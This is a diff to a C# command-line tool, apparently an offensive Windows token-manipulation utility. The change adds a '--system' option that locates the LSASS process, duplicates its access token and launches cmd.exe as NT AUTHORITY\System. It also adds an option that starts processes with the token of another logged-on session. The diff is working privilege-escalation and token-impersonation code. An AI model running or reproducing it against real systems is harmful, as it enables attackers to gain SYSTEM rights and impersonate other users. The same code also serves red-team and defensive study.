@@ -1,6 +1,9 @@
 ﻿using CommandLine;
 using System;
+using System.Linq;
 using TokenManage;
+using TokenManage.Domain;
+using TokenManage.Domain.AccessTokenInfo;
 
 namespace TokenManageCLI
 {
@@ -16,6 +19,12 @@ namespace TokenManageCLI
 
         [Option('c', "command", Required = false, Default = null, HelpText = "The command arguments to use.")]
         public string CommandLine { get; set; }
+
+        [Option('s', "system", Required = false, Default = false, HelpText = "Automatically attempts to open a CMD shell running as NT AUTHORITY\\System")]
+        public bool System { get; set; }
+
+        [Option('S', "session", Required = false, Default = 0, HelpText = "Starts a process using the token connected to the specified session id.")]
+        public uint SessionId { get; set; }
     }
 
     public class StartProcess
@@ -33,49 +42,43 @@ namespace TokenManageCLI
 
         public void Execute()
         {
-            if (!this.options.ProcessID.HasValue)
+            if(this.options.ProcessID.HasValue)
             {
-                this.console.Error($"Currently only works when you specify process id.");
-                return;
+                BorrowProcessToken(this.options.ProcessID.Value);
             }
-
-            int pid = this.options.ProcessID.Value;
-            this.console.Debug($"Attempting to open handle to process with id {pid}");
-            IntPtr hProc = WinInterop.OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);
-            if (hProc == IntPtr.Zero)
+            else if(this.options.System)
             {
-                this.console.Error($"Cannot open handle to process. OpenProcess failed with error code: {WinInterop.GetLastError()}.");
-                return;
+                var processes = TMProcess.GetProcessByName("lsass");
+                if(processes.Count == 0)
+                {
+                    console.Error("Failed to find LSASS process. That is weird.");
+                    return;
+                }
+                else if(processes.Count > 1)
+                {
+                    console.Error("Found multiple LSASS processes. That is weird.");
+                    return;
+                }
+                else
+                {
+                    var lsassProcess = processes.First();
+                    BorrowProcessToken(lsassProcess.ProcessId);
+                }
             }
-            this.console.Debug($"Successfully retrieved handle.");
-
-            uint desiredAccess = WinInterop.TOKEN_IMPERSONATE;
-            desiredAccess |= WinInterop.TOKEN_QUERY;
-            desiredAccess |= WinInterop.TOKEN_DUPLICATE;
-            desiredAccess |= WinInterop.TOKEN_ASSIGN_PRIMARY;
-            IntPtr hToken;
-            this.console.Debug($"Attempting to open handle to process token.");
-            if (!WinInterop.OpenProcessToken(hProc, desiredAccess, out hToken))
+            else
             {
-                this.console.Error($"Cannot open handle to process token. OpenProcessToken failed with error code: {WinInterop.GetLastError()}");
-                return;
+                BorrowSessionToken(this.options.SessionId);
             }
-            this.console.Debug($"Successfully retrieved handle.");
+        }
 
-            IntPtr hDuplicate = IntPtr.Zero;
-            SECURITY_ATTRIBUTES secAttr = new SECURITY_ATTRIBUTES();
+        public void BorrowSessionToken(uint sessionId)
+        {
+            var hToken = AccessTokenHandle.FromSessionId(sessionId);
 
-            this.console.Debug($"Attempting to duplicate token.");
-            if (!WinInterop.DuplicateTokenEx(hToken, WinInterop.TOKEN_ALL_ACCESS, ref secAttr, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hDuplicate))
-            {
-                this.console.Error($"Failed to duplicate token. DuplicateTokenEx failed with error code: {WinInterop.GetLastError()}");
-                return;
-            }
-            this.console.Debug($"Successfully duplicated token.");
-
+            var hDuplicate = AccessTokenHandle.Duplicate(hToken, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, TokenAccess.TOKEN_ALL_ACCESS);
+            
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi;
-
             this.console.Debug($"Starting new process.");
             string applicationName = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\cmd.exe";
             if (this.options.ApplicationName != null)
@@ -84,12 +87,46 @@ namespace TokenManageCLI
             }
             this.console.Debug($"Starting with application: {applicationName}");
 
-            if (!WinInterop.CreateProcessWithTokenW(hDuplicate, LogonFlags.NetCredentialsOnly, applicationName, this.options.CommandLine, CreationFlags.NewConsole, IntPtr.Zero, @"C:\", ref si, out pi))
+            if (!WinInterop.CreateProcessWithTokenW(hDuplicate.GetHandle(), LogonFlags.NetCredentialsOnly, applicationName, this.options.CommandLine, CreationFlags.NewConsole, IntPtr.Zero, @"C:\", ref si, out pi))
             {
                 this.console.Error($"Failed to create shell. CreateProcessWithTokenW failed with error code: {WinInterop.GetLastError()}");
                 return;
             }
+        }
 
+        public void BorrowProcessToken(int pid)
+        {
+            this.console.Debug($"Attempting to open handle to process with id {pid}");
+
+            var hProc = TMProcessHandle.FromProcessId(pid, ProcessAccessFlags.QueryInformation);
+
+            this.console.Debug($"Successfully retrieved process handle.");
+
+            uint desiredAccess = WinInterop.TOKEN_IMPERSONATE;
+            desiredAccess |= WinInterop.TOKEN_QUERY;
+            desiredAccess |= WinInterop.TOKEN_DUPLICATE;
+            desiredAccess |= WinInterop.TOKEN_ASSIGN_PRIMARY;
+            var hToken = AccessTokenHandle.FromProcessHandle(hProc, TokenAccess.TOKEN_IMPERSONATE,
+                TokenAccess.TOKEN_QUERY, TokenAccess.TOKEN_DUPLICATE, TokenAccess.TOKEN_ASSIGN_PRIMARY);
+            this.console.Debug($"Successfully retrieved process access token handle.");
+
+            var hDuplicate = AccessTokenHandle.Duplicate(hToken, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, TokenAccess.TOKEN_ALL_ACCESS);
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi;
+            this.console.Debug($"Starting new process.");
+            string applicationName = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\cmd.exe";
+            if (this.options.ApplicationName != null)
+            {
+                applicationName = this.options.ApplicationName;
+            }
+            this.console.Debug($"Starting with application: {applicationName}");
+
+            if (!WinInterop.CreateProcessWithTokenW(hDuplicate.GetHandle(), LogonFlags.NetCredentialsOnly, applicationName, this.options.CommandLine, CreationFlags.NewConsole, IntPtr.Zero, @"C:\", ref si, out pi))
+            {
+                this.console.Error($"Failed to create shell. CreateProcessWithTokenW failed with error code: {WinInterop.GetLastError()}");
+                return;
+            }
         }
     }
 }
